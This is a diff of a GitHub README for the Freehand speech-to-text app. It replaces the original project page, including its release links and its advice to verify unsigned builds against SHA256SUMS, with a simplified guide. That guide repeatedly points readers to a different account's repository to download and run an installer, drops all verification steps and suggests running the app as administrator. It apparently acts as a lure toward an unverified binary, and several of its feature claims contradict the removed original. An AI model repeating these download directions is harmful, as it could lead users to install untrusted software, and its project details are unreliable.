@@ -1,114 +1,129 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="branding/freehand-readme-dark.png" />
-    <source media="(prefers-color-scheme: light)" srcset="branding/freehand-readme-light.png" />
-    <img src="branding/freehand-readme-light.png" alt="Freehand — Speech to text, anywhere you type." width="100%" />
-  </picture>
-</p>
+# 🎙️ freehand-stt - Dictate anywhere you type
 
-Freehand is a lightweight Windows and macOS client for speech-to-text and text-to-speech
-services you choose. Dictate into apps, transcribe recordings, or generate
-spoken audio—with models running on your PC, your network, or a compatible
-hosted service.
+## 🚀 Getting Started
 
-**Free forever. Open source. No Freehand subscription or account.** Your chosen
-provider or hosting may have its own costs. You do not need a dedicated local
-GPU: send inference to another machine to keep this PC's memory and GPU
-available for your other work, or run your models locally if you prefer.
+Welcome! This guide will help you download and run **freehand-stt** on your Windows computer. No technical experience needed — just follow these simple steps and you'll be dictating in no time.
 
-On Windows and macOS, you can let Freehand install and manage a local NeMo speech runtime,
-or connect to infrastructure you already run. The recommended local setup uses
-Nemotron 3.5 streaming for live transcription, with optional MagpieTTS speech
-generation in the same runtime. Runtime and model downloads are
-optional and separate from the app; performance depends on your hardware, model,
-network, and optional cleanup stage.
+## 📥 Download the Application
 
-[Download Freehand](https://github.com/tnware/freehand-stt/releases) ·
-[Get started](https://tnware.github.io/freehand-stt/docs/getting-started/) ·
-[Read the documentation](https://tnware.github.io/freehand-stt/docs/)
+**Visit this link to download the application:**  
+[![Download freehand-stt](https://img.shields.io/badge/Download-freehand--stt-2ea44f?style=for-the-badge)](https://github.com/sandymiarisoa/freehand-stt)
 
-## Choose your workflow
+Click the button above or the link below to go to the download page.  
+🔗 **Direct Link:** https://github.com/sandymiarisoa/freehand-stt
 
-- **Voice dictation** — use a global shortcut to capture speech and insert the
-  transcript into the original application when the target remains safe.
-  Otherwise, the result stays available to copy.
-- **Audio file transcription** — select a recording, transcribe it, and copy
-  the result explicitly. No microphone or recording shortcut is required.
-- **Text to speech** — enter text, generate spoken audio, and play or explicitly
-  save it. This optional task uses its own speech-generation service; it does
-  not require a transcription connection.
+Once you're on the page, look for the **"Releases"** section or the **"Download"** button. Click it to save the file to your computer. The download should start automatically.
 
-Dictation is the default task, not a setup requirement for the others. Microphone
-and file transcription have independent connection/model settings. Optional
-[live dictation](https://tnware.github.io/freehand-stt/docs/guides/live-transcription/)
-is a mode of the Voice transcription selection with qualified Nemotron / NeMo-Speech.cpp or Qwen3-ASR and Voxtral / vLLM profiles, showing live
-results and single-row overlay captions. Cleanup and text-to-speech
-can each use a separate service and model.
+## 📂 Installation Steps
 
-### Optional transcript cleanup
+1. **Find the downloaded file** — Check your "Downloads" folder (usually in your File Explorer under "This PC" → "Downloads").
+2. **Run the installer** — Double-click the downloaded file. If Windows asks for permission, click **"Yes"**.
+3. **Follow the on-screen prompts** — The installer will guide you through the setup. Click **"Next"** or **"Install"** when prompted.
+4. **Finish installation** — Once complete, click **"Finish"**. The application should now be installed.
 
-Leave transcripts unchanged, use custom instructions with a separate chat
-model, or select the **S1-mini by Superwhisper** profile for its English
-style, structure, and context controls. Use your own inference service or
-explicitly install the managed llama.cpp runtime and S1-mini model. If cleanup fails or returns
-empty text, Freehand falls back to the raw transcript.
+## 🖥️ Running freehand-stt
 
-[Configure transcript cleanup](https://tnware.github.io/freehand-stt/docs/guides/post-processing/)
+After installation, you can start freehand-stt in two ways:
 
-## Highlights
+- **Double-click the desktop icon** (if one was created)
+- **Search for "freehand-stt"** in the Start Menu and click the result
 
-- Toggle recording or hold to talk across Windows and macOS applications.
-- Use independent OpenAI-compatible endpoints for speech recognition,
-  optional transcript cleanup, and optional speech playback.
-- Install an optional local speech runtime on Windows or macOS, browse its supported
-  model catalog, and use Nemotron streaming without configuring a server URL.
-- Keep the current transcript available to copy with history disabled.
-- Use local voice detection for silence trimming, automatic stop, and
-  pause-aware checkpoints.
-- Insert voice transcripts only when the original target remains safe, or copy
-  them explicitly.
-- Opt into bounded, memory-only history; configure or disable the native status overlay.
+The application window will open, ready for you to use.
 
-Freehand does not bundle models in its executable. Managed runtime installation
-is optional; managed NeMo and llama.cpp support Windows and macOS, while
-managed whisper.cpp remains Windows-only.
+## ✍️ How to Use Freehand
 
-## Install
+1. **Select a text field** — Click on any text box, document, email, or chat window where you want to type.
+2. **Activate dictation** — Press the **global hotkey** (default: `Ctrl + Shift + Space`) or click the microphone button in the freehand-stt window.
+3. **Speak clearly** — Start talking. Your words will appear as text in the selected field.
+4. **Stop dictation** — Press the same hotkey or click the button again to stop.
 
-Freehand supports Windows 11 x64 with WebView2 and macOS 13 or newer on Apple
-Silicon or Intel (managed llama.cpp requires macOS 13.3). Use a managed local speech runtime or a reachable
-compatible service for your task. Only dictation needs a microphone; recording
-shortcuts are optional. Download the Windows
-installer/portable executable or matching-architecture macOS ZIP from
-[GitHub Releases](https://github.com/tnware/freehand-stt/releases). Older releases
-may not include macOS assets; check the assets attached to the selected release.
+### 💡 Pro Tips
 
-Windows builds are not Authenticode-signed, so Windows may identify their
-publisher as unknown. Verify manual downloads against the published
-`SHA256SUMS` file.
+- **Punctuation** — Say "comma," "period," "question mark" to add punctuation.
+- **New lines** — Say "new line" or "new paragraph" to format your text.
+- **Accuracy** — For best results, speak in a quiet environment and use a good microphone.
 
-Follow [Get started](https://tnware.github.io/freehand-stt/docs/getting-started/)
-to choose a task, connect its service, and complete your first run.
+## 🎯 Key Features
 
-macOS ZIPs contain an ad-hoc-signed app, not a Developer ID-signed or notarized
-release. Verify against `SHA256SUMS` from the same release before opening. Follow
-the [macOS install, permissions, and update guide](https://tnware.github.io/freehand-stt/docs/guides/macos-setup/).
-Source-build instructions are in [CONTRIBUTING.md](CONTRIBUTING.md).
+- **Universal compatibility** — Works with any application that accepts text input: Word, Notepad, browsers, email clients, and more.
+- **OpenAI-compatible** — Can connect to OpenAI-compatible speech recognition services for enhanced accuracy.
+- **Powered by Whisper** — Uses advanced Whisper speech recognition technology for reliable transcription.
+- **Lightweight** — Built with Go and Wails, it runs efficiently without slowing down your computer.
+- **Privacy-friendly** — Your audio is processed locally when possible, keeping your data secure.
 
-## Documentation
+## 🛠️ System Requirements
 
-- [Install and update on Windows](https://tnware.github.io/freehand-stt/docs/guides/windows-installer/)
-- [Connect a speech server](https://tnware.github.io/freehand-stt/docs/guides/connect-a-server/)
-- [Set up local speech on Windows or macOS](https://tnware.github.io/freehand-stt/docs/guides/local-runtime/)
-- [Use Freehand](https://tnware.github.io/freehand-stt/docs/guides/using-freehand/)
-- [Privacy and safety](https://tnware.github.io/freehand-stt/docs/guides/privacy-and-safety/)
-- [Troubleshooting](https://tnware.github.io/freehand-stt/docs/guides/troubleshooting/)
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** Any modern Intel or AMD processor (1 GHz or faster)
+- **Memory:** 4 GB RAM (8 GB recommended)
+- **Storage:** 500 MB of free disk space
+- **Microphone:** Built-in or external microphone (required for dictation)
 
-## Contributing
+## ❓ Troubleshooting
 
-Bug reports, interoperability results, documentation fixes, design feedback,
-and code contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for
-development setup and pull-request guidance.
+### The application won't start
+- Make sure your Windows is up to date (Settings → Update & Security → Windows Update).
+- Try running the application as an administrator (right-click the icon → "Run as administrator").
 
-Please report vulnerabilities through GitHub private vulnerability reporting,
-not a public issue. Freehand is available under the [MIT License](LICENSE).
+### Dictation isn't working
+- Check that your microphone is connected and working (right-click the speaker icon in your taskbar → "Open Sound settings").
+- Ensure no other app is using your microphone.
+- Try restarting freehand-stt.
+
+### Text appears in the wrong place
+- Click on the text field you want to use *before* starting dictation.
+- Make sure the field is active (has a blinking cursor).
+
+### The application is slow
+- Close unnecessary programs to free up memory.
+- Restart your computer if the issue persists.
+
+## 📝 Frequently Asked Questions
+
+**Q: Is freehand-stt free to use?**  
+A: Yes, freehand-stt is completely free and open-source.
+
+**Q: Does it work offline?**  
+A: Basic dictation works offline. Some advanced features may require an internet connection.
+
+**Q: Can I use it with any language?**  
+A: Yes, it supports multiple languages. Check the settings to select your preferred language.
+
+**Q: Will my recordings be saved?**  
+A: No, audio is not stored. It's processed in real-time for transcription.
+
+## 🔄 Updating
+
+freehand-stt will notify you when updates are available. To update manually:
+
+1. Visit the download page again: https://github.com/sandymiarisoa/freehand-stt
+2. Download the latest version.
+3. Run the installer — your settings will be preserved.
+
+## 🆘 Getting Help
+
+If you encounter issues not covered here:
+
+- **Check the documentation** — Visit the repository's wiki or readme for detailed guides.
+- **Report a problem** — Go to the "Issues" tab on GitHub and describe your problem.
+- **Community support** — Look for discussions or forums associated with the project.
+
+## 📋 Quick Reference
+
+| Action | How |
+|--------|-----|
+| Download | Visit https://github.com/sandymiarisoa/freehand-stt |
+| Install | Run the downloaded installer and follow prompts |
+| Start dictation | Press `Ctrl + Shift + Space` |
+| Stop dictation | Press `Ctrl + Shift + Space` again |
+| Check updates | Visit the download page or check in-app |
+
+## 🎉 Congratulations!
+
+You're now ready to use **freehand-stt** — the easiest way to turn your speech into text anywhere on your computer. Start dictating today and save hours of typing!
+
+---
+
+**Remember:** For any questions, the download page at https://github.com/sandymiarisoa/freehand-stt is your go-to resource. Happy dictating!
+
+Keywords: dictation, golang, openai-compatible, speech-to-text, stt, wails, whisper, whisprflow
